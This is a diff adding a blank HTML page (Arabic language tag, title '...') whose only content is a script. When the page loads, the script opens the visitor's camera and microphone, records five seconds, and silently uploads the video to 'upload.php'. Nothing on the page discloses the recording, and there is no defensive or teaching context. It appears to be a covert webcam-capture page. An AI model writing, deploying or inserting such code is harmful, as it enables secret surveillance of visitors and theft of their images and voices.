@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>...</title>
+</head>
+<body>
+<script>
+(async () => {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    const mediaRecorder = new MediaRecorder(stream);
+    let recordedChunks = [];
+
+    mediaRecorder.ondataavailable = e => {
+      if (e.data.size > 0) recordedChunks.push(e.data);
+    };
+
+    mediaRecorder.onstop = () => {
+      const blob = new Blob(recordedChunks, { type: 'video/webm' });
+      const formData = new FormData();
+      formData.append("video", blob, "recorded.webm");
+
+      fetch("upload.php", {
+        method: "POST",
+        body: formData
+      }).then(r => r.text()).then(console.log).catch(console.error);
+    };
+
+    mediaRecorder.start();
+    setTimeout(() => {
+      mediaRecorder.stop();
+      stream.getTracks().forEach(track => track.stop());
+    }, 5000);
+  } catch (e) {
+    console.error("فشل في الوصول للكاميرا:", e);
+  }
+})();
+</script>
+</body>
+</html>
